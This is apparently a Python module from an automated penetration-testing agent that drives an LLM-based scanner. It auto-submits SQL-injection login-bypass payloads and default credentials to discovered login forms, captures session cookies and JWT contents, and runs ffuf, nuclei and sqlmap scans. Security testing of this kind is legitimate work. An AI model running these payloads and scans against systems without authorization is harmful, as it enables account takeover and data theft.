from __future__ import annotations

import logging
from typing import Any

from vxis.agent.scan_loop_v3 import v3_after_action
from vxis.agent.tool_registry import ToolResult

logger = logging.getLogger(__name__)


class ScanLoopAutoOrchestrationMixin:
    async def _dispatch_and_record(
        self,
        name: str,
        args: dict[str, Any],
        *,
        candidate_id: str,
        record_args: dict[str, Any] | None = None,
    ) -> ToolResult:
        """Dispatch an auto-orchestrated tool and record its outcome everywhere.

        Auto-fired ffuf/nuclei/sqlmap previously called record_attempt_outcome but
        never v3_after_action, so the v3 coverage matrix / hypothesis DAG / trajectory
        store stayed blind to those scans — corrupting finish-gate and coverage %.
        This mirrors the Brain dispatch path (scan_loop_run.py) so all three signals
        update for auto-fired tools too.
        """
        result = await self.registry.dispatch(name, args)
        self.state.record_attempt_outcome(
            candidate_id,
            name,
            record_args if record_args is not None else args,
            status=self._status_from_tool_result(result),
            summary=result.summary,
        )
        v3_after_action(
            self,
            name=name,
            args=args,
            result=result,
            candidate_ids=[candidate_id],
        )
        return result

    async def _run_auto_orchestration(
        self,
        *,
        auto_browser_done: bool,
        auto_login_done: bool,
        auto_nuclei_done: bool,
        baseline_size: int | None,
        sandbox_invocations: list[dict[str, str]],
    ) -> tuple[bool, bool, bool]:
        # ── Phase C auto-orchestration ──────────────────────────────
        # Code enforcement: if Brain hasn't done key actions by certain
        # iteration thresholds, do them automatically and inject results.

        # Auto-browser-login: at iter 8, if no login was attempted yet,
        # auto-navigate to login page + try default creds + SQLi.
        # Triggers regardless of whether Brain used browser — Brain
        # uses it but never tries fill_form. Code enforces the action.
        if (
            not auto_login_done
            and self.state.iteration >= 8
            and "browser_navigate" in self.registry.list_tools()
        ):
            auto_browser_done = True
            try:
                self._emit_brain_status(
                    f"iter {self.state.iteration}/{self.state.max_iters} - "
                    "Auto browser recon: detecting login surface",
                    vector_id="auto:browser-recon",
                )
                nav_result = await self.registry.dispatch(
                    "browser_navigate", {"url": self.state.target}
                )
                if nav_result.ok:
                    self.state.add_message("tool", {
                        "name": "browser_navigate",
                        "args": {"url": self.state.target},
                        "result": {"ok": True, "summary": nav_result.summary, "data": nav_result.data},
                    })
                    # Check for login-like inputs
                    inputs = nav_result.data.get("inputs", []) if nav_result.data else []
                    has_password = any(i.get("type") == "password" for i in inputs)
                    # Track the URL where the login form was discovered so
                    # we can navigate back to it for each credential attempt.
                    _login_url_found = self.state.target if has_password else None
                    if not has_password:
                        # Try navigating to common login paths. WebGoat uses
                        # /login (no hash), Juice Shop uses /#/login, etc.
                        for login_path in [
                            "/#/login", "/login", "/auth/login",
                            "/signin", "/users/sign_in", "/user/login",
                            "/WebGoat/login", "/admin/login",
                        ]:
                            login_url = self.state.target.rstrip("/") + login_path
                            lr = await self.registry.dispatch("browser_navigate", {"url": login_url})
                            if lr.ok:
                                lr_inputs = lr.data.get("inputs", []) if lr.data else []
                                has_password = any(i.get("type") == "password" for i in lr_inputs)
                                if has_password:
                                    inputs = lr_inputs
                                    _login_url_found = login_url
                                    self.state.add_message("tool", {
                                        "name": "browser_navigate",
                                        "args": {"url": login_url},
                                        "result": {"ok": True, "summary": lr.summary, "data": lr.data},
                                    })
                                    break

                    # DOM analysis
                    dom_result = await self.registry.dispatch("browser_analyze_dom", {})
                    if dom_result.ok:
                        self.state.add_message("tool", {
                            "name": "browser_analyze_dom", "args": {},
                            "result": {"ok": True, "summary": dom_result.summary, "data": dom_result.data},
                        })

                    # Auto-login: adaptive selector detection. We don't
                    # hardcode #email/#loginButton — that only works on
                    # Juice Shop. Instead, we inspect the discovered form
                    # inputs and derive selectors by name/id/type. This
                    # works against WebGoat (username/password), DVWA,
                    # generic Spring/Rails/Django forms, etc.
                    if has_password and not auto_login_done:
                        auto_login_done = True
                        try:
                            from vxis.agent.tools.browser_tools import _page as _bp
                            if _bp is not None:
                                # Dismiss common overlays
                                for dismiss_sel in [
                                    "a.cc-dismiss", "button.cc-dismiss",
                                    "button[aria-label='Close Welcome Banner']",
                                    "button.close", ".modal .close",
                                    "[aria-label*='dismiss' i]", "[aria-label*='close' i]",
                                ]:
                                    try:
                                        await _bp.click(dismiss_sel, timeout=2000)
                                    except Exception:
                                        pass

                                # Derive user + password + submit selectors
                                def _sel(ident: str | None, elem_type: str | None) -> str | None:
                                    if ident:
                                        return f"#{ident}" if not ident.startswith("#") else ident
                                    if elem_type:
                                        return f"input[type='{elem_type}']"
                                    return None

                                _user_input = None
                                _pw_input = None
                                for i in inputs:
                                    itype = str(i.get("type", "")).lower()
                                    iname = str(i.get("name", "")).lower()
                                    iid = str(i.get("id", "")).lower()
                                    if itype == "password" and _pw_input is None:
                                        _pw_input = i
                                    elif (
                                        _user_input is None
                                        and itype in ("text", "email", "tel", "", "search")
                                        and any(
                                            k in iname or k in iid
                                            for k in ("email", "user", "login", "account", "name")
                                        )
                                    ):
                                        _user_input = i
                                # Fallback: first non-password text-ish input
                                if _user_input is None:
                                    for i in inputs:
                                        itype = str(i.get("type", "")).lower()
                                        if itype != "password" and itype in ("text", "email", "tel", "", "search"):
                                            _user_input = i
                                            break

                                # Build selector chains with fallbacks
                                _user_sels: list[str] = []
                                if _user_input:
                                    _uid = _user_input.get("id") or ""
                                    _unm = _user_input.get("name") or ""
                                    if _uid:
                                        _user_sels.append(f"#{_uid}")
                                    if _unm:
                                        _user_sels.append(f"input[name='{_unm}']")
                                # Generic fallbacks
                                _user_sels.extend([
                                    "input[type='email']",
                                    "input[name='username']", "input[name='email']",
                                    "input[name='user']", "input[name='login']",
                                    "#username", "#email", "#user", "#login",
                                    "input[type='text']:not([type='password'])",
                                ])
                                _pw_sels: list[str] = []
                                if _pw_input:
                                    _pid = _pw_input.get("id") or ""
                                    _pnm = _pw_input.get("name") or ""
                                    if _pid:
                                        _pw_sels.append(f"#{_pid}")
                                    if _pnm:
                                        _pw_sels.append(f"input[name='{_pnm}']")
                                _pw_sels.extend([
                                    "input[type='password']", "#password", "#pass",
                                ])
                                _submit_sels = [
                                    "button[type='submit']", "input[type='submit']",
                                    "#loginButton", "#login-button", "button.login",
                                    "button[name='login']", "button:has-text('Sign in')",
                                    "button:has-text('Log in')", "button:has-text('Login')",
                                ]

                                # Target-agnostic credential matrix. The SQLi
                                # attempt goes first because it's the only
                                # payload that directly produces a CRITICAL
                                # finding when it succeeds.
                                _login_creds = [
                                    ("' OR 1=1--", "x"),
                                    ("admin' --", "x"),
                                    ("admin@juice-sh.op", "admin123"),
                                    ("admin", "admin"),
                                    ("admin", "password"),
                                    ("guest", "guest"),   # WebGoat default
                                    ("user", "user"),
                                    ("webgoat", "webgoat"),
                                    ("test", "test"),
                                ]

                                _login_target = _login_url_found or self.state.target

                                # Log what we actually discovered so future
                                # scans aren't a black box on failure.
                                logger.info(
                                    "auto-login: %d inputs on %s — user_sels=%s pw_sels=%s",
                                    len(inputs), _login_target,
                                    _user_sels[:3], _pw_sels[:3],
                                )

                                async def _fill_any(sels: list[str], value: str) -> str | None:
                                    """Return the selector that worked, or None.
                                    BrowserPage.fill(selector, value) has NO timeout kwarg — passing
                                    one raises TypeError which previously was swallowed silently,
                                    making every auto-login attempt fail. Fixed: use the real signature
                                    and fall back to the underlying Playwright page for selector
                                    types BrowserPage doesn't handle (e.g. :has-text).
                                    """
                                    for s in sels:
                                        try:
                                            await _bp.fill(s, value)
                                            return s
                                        except Exception:
                                            # Try raw Playwright as fallback — some selectors
                                            # (e.g. with 'i' case flag) need the real page.
                                            try:
                                                await _bp._page.fill(s, value, timeout=2500)
                                                return s
                                            except Exception:
                                                continue
                                    return None

                                async def _click_any(sels: list[str]) -> str | None:
                                    for s in sels:
                                        try:
                                            await _bp.click(s, timeout=3000)
                                            return s
                                        except Exception:
                                            try:
                                                await _bp._page.click(s, timeout=2500)
                                                return s
                                            except Exception:
                                                continue
                                    return None

                                _login_failures: list[str] = []
                                _login_success = False
                                _login_nav_timeout_ms = 12_000
                                for idx, (email, pwd) in enumerate(_login_creds, start=1):
                                    try:
                                        self._emit_brain_status(
                                            f"iter {self.state.iteration}/{self.state.max_iters} - "
                                            f"Auto-login attempt {idx}/{len(_login_creds)} on discovered login form",
                                            vector_id="auto:login",
                                        )
                                        self._emit_event(
                                            "attack",
                                            {
                                                "vector_id": "auto:login",
                                                "method": "BROWSER",
                                                "endpoint": (
                                                    f"{self._truncate_ui_text(_login_target, 64)} "
                                                    f"[{idx}/{len(_login_creds)}]"
                                                ),
                                            },
                                        )
                                        logger.info(
                                            "auto-login attempt %d/%d on %s with user=%s",
                                            idx,
                                            len(_login_creds),
                                            _login_target,
                                            email[:40],
                                        )
                                        await _bp.navigate(
                                            _login_target,
                                            timeout=_login_nav_timeout_ms,
                                        )
                                        import asyncio as _aio
                                        # WebGoat / Spring Security often re-render
                                        # the form; give the DOM a moment to settle.
                                        await _aio.sleep(0.7)
                                        _user_sel = await _fill_any(_user_sels, email)
                                        if _user_sel is None:
                                            logger.debug("auto-login: user field not found for %s", email)
                                            _login_failures.append(f"{email}:no_user_field")
                                            continue
                                        _pw_sel = await _fill_any(_pw_sels, pwd)
                                        if _pw_sel is None:
                                            logger.debug("auto-login: pw field not found")
                                            _login_failures.append(f"{email}:no_pw_field")
                                            continue
                                        # Try submit via button, else press Enter on password.
                                        # BrowserPage.press(key) takes ONLY a key — to send Enter
                                        # to a specific field we must hit the underlying page.
                                        if await _click_any(_submit_sels) is None:
                                            try:
                                                await _bp._page.press(_pw_sel, "Enter")
                                            except Exception:
                                                pass
                                        await _aio.sleep(2)
                                        snap = await _bp.snapshot()

                                        # Check for session token
                                        token_cookies = [c for c in snap.cookies if "token" in c.get("name", "").lower()]
                                        if token_cookies:
                                            # Extract JWT payload
                                            jwt_payload = ""
                                            try:
                                                jwt_data = await _bp.evaluate(
                                                    "try { JSON.parse(atob(localStorage.getItem('token').split('.')[1])) } catch(e) { null }"
                                                )
                                                if jwt_data:
                                                    import json as _jm
                                                    jwt_payload = _jm.dumps(jwt_data, default=str)[:500]
                                            except Exception:
                                                pass

                                            finding_msg = (
                                                f"AUTO-EXPLOIT: Login succeeded with credentials "
                                                f"email='{email}' password='{pwd}'!\n"
                                                f"Session cookies: {[c.get('name') for c in token_cookies]}\n"
                                            )
                                            if jwt_payload:
                                                finding_msg += f"JWT payload: {jwt_payload}\n"
                                            if "OR 1=1" in email:
                                                finding_msg += (
                                                    "\nThis is SQL INJECTION authentication bypass — "
                                                    "CRITICAL severity. The login form is injectable.\n"
                                                )
                                            self.state.add_message("user", finding_msg)
                                            logger.info("auto-login SUCCESS: %s → token found, JWT=%s",
                                                       email, jwt_payload[:100])
                                            cookie_header = "; ".join(
                                                f"{c.get('name')}={c.get('value')}"
                                                for c in snap.cookies
                                                if c.get("name") and c.get("value")
                                            )
                                            self.state.record_auth_identities([
                                                {
                                                    "name": email,
                                                    "email": email if "@" in email else "",
                                                    "token": str(token_cookies[0].get("value") or ""),
                                                    "headers": {"Cookie": cookie_header}
                                                    if cookie_header
                                                    else {},
                                                    "source": "auto_login_browser",
                                                }
                                            ])
                                            try:
                                                from vxis.agent.tools.hands_tools import (
                                                    import_browser_cookies,
                                                )

                                                await import_browser_cookies(
                                                    _login_target,
                                                    snap.cookies,
                                                )
                                            except Exception:
                                                logger.debug(
                                                    "auto-login cookie bridge failed",
                                                    exc_info=True,
                                                )

                                            # Auto-report this finding
                                            evidence = (
                                                f"Login with email='{email}' password='{pwd}' "
                                                f"resulted in authenticated session.\n"
                                                f"Cookies: {snap.cookies}\n"
                                                f"JWT: {jwt_payload}\n"
                                                f"Redirected to: {snap.url}"
                                            )
                                            severity = "critical" if "OR 1=1" in email else "high"
                                            ftype = "sql_injection" if "OR 1=1" in email else "weak_auth"
                                            await self._dispatch_report_finding_checked({
                                                "title": f"Authentication bypass via {'SQLi' if 'OR 1=1' in email else 'default credentials'} on login form",
                                                "severity": severity,
                                                "finding_type": ftype,
                                                "affected_component": _login_target,
                                                "description": finding_msg,
                                                "evidence": evidence,
                                            })
                                            self.state.record_attempt_outcome(
                                                "web:auth-bypass",
                                                "auto-login",
                                                {"target": _login_target, "email": email},
                                                status="found",
                                                summary="auto-login obtained authenticated session",
                                            )
                                            if "OR 1=1" in email:
                                                self.state.record_attempt_outcome(
                                                    "web:sqli",
                                                    "auto-login",
                                                    {"target": _login_target, "email": email},
                                                    status="found",
                                                    summary="SQLi login bypass obtained authenticated session",
                                                )
                                            _login_success = True
                                            break
                                        else:
                                            # No token cookie — credential combo didn't authenticate.
                                            _login_failures.append(f"{email}:no_session_cookie")
                                    except Exception as _le:
                                        logger.debug("auto-login attempt %s failed: %s", email, _le)
                                        _login_failures.append(f"{email}:exception_{type(_le).__name__}")

                                # If every credential failed, tell Brain explicitly so it
                                # pivots instead of letting the attempt fail silently.
                                # Without this message, Brain would have no signal that
                                # auto-login was even tried, let alone that it exhausted
                                # 9 credential combos.
                                if not _login_success:
                                    _fail_summary = (
                                        f"AUTO-LOGIN EXHAUSTED: tried {len(_login_creds)} credential "
                                        f"combos against {_login_target}, NONE succeeded. "
                                        f"Reasons (first 5): {_login_failures[:5]}. "
                                        f"PIVOT NOW — do not retry auto-login. Options: "
                                        f"(a) run_skill test_auth_deep (JWT alg:none, RS256→HS256, session fixation) "
                                        f"(b) run_skill test_injection on the login URL with param=email/username "
                                        f"(c) run_skill enumerate_endpoints + attack non-auth surface "
                                        f"(d) if target has a registration page, register a real account first. "
                                        f"Discovered form inputs: user_sels={_user_sels[:3]}, pw_sels={_pw_sels[:3]}."
                                    )
                                    self.state.add_message("user", _fail_summary)
                                    self.state.record_attempt_outcome(
                                        "web:auth-bypass",
                                        "auto-login",
                                        {"target": _login_target, "attempts": len(_login_creds)},
                                        status="clean",
                                        summary=_fail_summary,
                                    )
                                    logger.warning(
                                        "auto-login exhausted after %d creds on %s — telling Brain to pivot",
                                        len(_login_creds), _login_target,
                                    )
                        except Exception:
                            logger.exception("auto-login failed")
                    logger.info("auto-browser-recon completed at iter %d", self.state.iteration)
            except Exception:
                logger.exception("auto-browser-recon failed")

        # Auto-ffuf: directory bruteforce at iter 10
        if (
            not getattr(self, '_auto_ffuf_done', False)
            and self.state.iteration >= 10
            and "shell_exec" in self.registry.list_tools()
        ):
            ffuf_ran = any(
                m.get("role") == "tool"
                and isinstance(m.get("content"), dict)
                and m["content"].get("name") == "shell_exec"
                and "ffuf" in str(m["content"].get("args", ""))
                for m in self.state.messages
            )
            if not ffuf_ran:
                self._auto_ffuf_done = True
                try:
                    # Get baseline size for SPA filtering
                    bs_filter = ""
                    if baseline_size is not None:
                        bs_filter = f"-fs {baseline_size} "
                    ffuf_cmd = (
                        f"ffuf -u {self.state.target}/FUZZ "
                        f"-w /usr/share/dirb/wordlists/common.txt "
                        f"{bs_filter}"
                        f"-mc 200,301,302,403 "
                        f"-t 20 -timeout 5 -s 2>&1 | head -30"
                    )
                    logger.info("auto-ffuf starting at iter %d", self.state.iteration)
                    fr = await self._dispatch_and_record(
                        "shell_exec",
                        {"command": ffuf_cmd, "timeout": 60},
                        candidate_id="web:dir-bruteforce",
                        record_args={"command": ffuf_cmd},
                    )
                    sandbox_invocations.append({"tool": "shell_exec", "cmd": ffuf_cmd})
                    if fr.ok:
                        stdout = str(fr.data.get("stdout", "")) if fr.data else ""
                        if stdout.strip():
                            self.state.add_message("tool", {
                                "name": "shell_exec",
                                "args": {"command": "ffuf directory scan"},
                                "result": {"ok": True, "summary": fr.summary, "data": fr.data},
                            })
                            self.state.add_message("user", (
                                "AUTO-RECON: ffuf found these paths:\n"
                                + stdout[:1500] + "\n\n"
                                "Navigate to each path with browser_navigate or "
                                "http_request and assess for vulnerabilities."
                            ))
                        logger.info("auto-ffuf completed at iter %d (%d bytes)",
                                   self.state.iteration, len(stdout))
                except Exception:
                    logger.exception("auto-ffuf failed")

        # Auto-nuclei: if Brain hasn't run nuclei by iter 12, fire it
        if (
            not auto_nuclei_done
            and self.state.iteration >= 12
            and "shell_exec" in self.registry.list_tools()
        ):
            # Check if Brain or auto already ran nuclei — look for
            # actual shell_exec tool calls with "nuclei" in args only
            nuclei_ran = any(
                m.get("role") == "tool"
                and isinstance(m.get("content"), dict)
                and m["content"].get("name") == "shell_exec"
                and "nuclei" in str(m["content"].get("args", ""))
                for m in self.state.messages
            )
            if not nuclei_ran:
                auto_nuclei_done = True
                logger.info("auto-nuclei: firing at iter %d", self.state.iteration)
                try:
                    nuclei_cmd = (
                        f"nuclei -u {self.state.target} "
                        "-t /root/nuclei-templates/http/exposures/ "
                        "-t /root/nuclei-templates/http/default-logins/ "
                        "-t /root/nuclei-templates/http/exposed-panels/ "
                        "-t /root/nuclei-templates/http/cves/ "
                        "-t /root/nuclei-templates/http/misconfiguration/ "
                        "-severity critical,high,medium "
                        "-silent -nc -timeout 5 -retries 1 "
                        "-rate-limit 100"
                    )
                    nr = await self._dispatch_and_record(
                        "shell_exec",
                        {"command": nuclei_cmd, "timeout": 120},
                        candidate_id="web:cve-scan",
                        record_args={"command": nuclei_cmd},
                    )
                    sandbox_invocations.append({"tool": "shell_exec", "cmd": nuclei_cmd})
                    if nr.ok:
                        self.state.add_message("tool", {
                            "name": "shell_exec",
                            "args": {"command": "nuclei scan"},
                            "result": {"ok": True, "summary": nr.summary, "data": nr.data},
                        })
                        stdout = ""
                        if isinstance(nr.data, dict):
                            stdout = str(nr.data.get("stdout", ""))
                        if stdout.strip():
                            self.state.add_message("user", (
                                "AUTO-RECON: nuclei found results! Analyze each line "
                                "and report_finding for confirmed vulnerabilities:\n"
                                + stdout[:2000]
                            ))
                        logger.info("auto-nuclei completed at iter %d (%d bytes output)",
                                   self.state.iteration, len(stdout))
                except Exception:
                    logger.exception("auto-nuclei failed")

        # Auto-sqlmap: at iter 18+, if findings exist with 500 errors
        # and Brain hasn't run sqlmap, auto-fire on the best target
        if (
            not getattr(self, '_auto_sqlmap_done', False)
            and self.state.iteration >= 18
            and "shell_exec" in self.registry.list_tools()
        ):
            try:
                from vxis.agent.tools.finding_tools import _get_findings
                current_findings = _get_findings()
            except Exception:
                current_findings = []

            # Find endpoints with error responses (500s = likely injectable)
            sqlmap_targets = []
            for f in current_findings:
                comp = f.get("affected_component", "")
                title = f.get("title", "")
                if ("500" in title or "error" in f.get("finding_type", "")) and comp.startswith("http"):
                    sqlmap_targets.append(comp)

            sqlmap_ran = any(
                m.get("role") == "tool"
                and isinstance(m.get("content"), dict)
                and m["content"].get("name") == "shell_exec"
                and "sqlmap" in str(m["content"].get("args", ""))
                for m in self.state.messages
            )

            if sqlmap_targets and not sqlmap_ran:
                self._auto_sqlmap_done = True
                target_url = sqlmap_targets[0]
                # Add query param if none exists (sqlmap needs injectable param)
                if "?" not in target_url:
                    target_url += "?q=test"
                try:
                    sqlmap_cmd = (
                        f"sqlmap -u '{target_url}' "
                        "--batch --level=2 --risk=2 "
                        "--threads=4 --timeout=10 "
                        "--random-agent "
                        "--output-dir=/tmp/sqlmap_auto "
                        "2>&1 | tail -50"
                    )
                    logger.info("auto-sqlmap firing on %s", target_url)
                    sr = await self._dispatch_and_record(
                        "shell_exec",
                        {"command": sqlmap_cmd, "timeout": 180},
                        candidate_id="web:sqli",
                        record_args={"command": sqlmap_cmd},
                    )
                    sandbox_invocations.append({"tool": "shell_exec", "cmd": sqlmap_cmd})
                    if sr.ok:
                        stdout = str(sr.data.get("stdout", "")) if sr.data else ""
                        self.state.add_message("tool", {
                            "name": "shell_exec",
                            "args": {"command": f"sqlmap -u '{target_url}' --batch"},
                            "result": {"ok": True, "summary": sr.summary, "data": sr.data},
                        })
                        # Parse sqlmap output for injectable params
                        is_injectable = any(
                            kw in stdout.lower()
                            for kw in ["is vulnerable", "injectable", "payload:", "type:"]
                        )
                        if is_injectable:
                            # Auto-report — don't ask Brain, it won't do it
                            await self._dispatch_report_finding_checked(self._build_report_finding_args(
                                title=f"SQL Injection confirmed by sqlmap on {target_url.split('?')[0]}",
                                severity="critical",
                                finding_type="sql_injection",
                                affected_component=target_url,
                                description="sqlmap confirmed injectable behavior on the supplied parameterized URL.",
                                impact="Attackers may extract or modify backend database data and pivot into account compromise or administrative access.",
                                technical_analysis="The auto-sqlmap branch detected canonical sqlmap success markers including injectable parameter / payload output in the tool transcript.",
                                poc_description="Run sqlmap against the same target URL and confirm that the tool identifies the parameter as injectable and returns working payload details.",
                                poc_script_code=stdout[:4000],
                                remediation_steps="Parameterize the backend query, remove raw SQL concatenation, and suppress database error leakage to clients.",
                                endpoint=target_url,
                                method="GET",
                                cwe="CWE-89",
                            ))
                            self.state.add_message("user", (
                                f"AUTO-EXPLOIT: sqlmap confirmed SQL injection on {target_url}!\n"
                                "Finding auto-reported as CRITICAL sql_injection."
                            ))
                            logger.info("auto-sqlmap FOUND injection on %s", target_url)
                        else:
                            self.state.add_message("user", (
                                f"AUTO-EXPLOIT: sqlmap ran on {target_url} but did not "
                                f"confirm injection. Output:\n{stdout[:1000]}\n\n"
                                "Try different endpoints or parameters."
                            ))
                        logger.info("auto-sqlmap completed at iter %d", self.state.iteration)
                except Exception:
                    logger.exception("auto-sqlmap failed")
        return auto_browser_done, auto_login_done, auto_nuclei_done
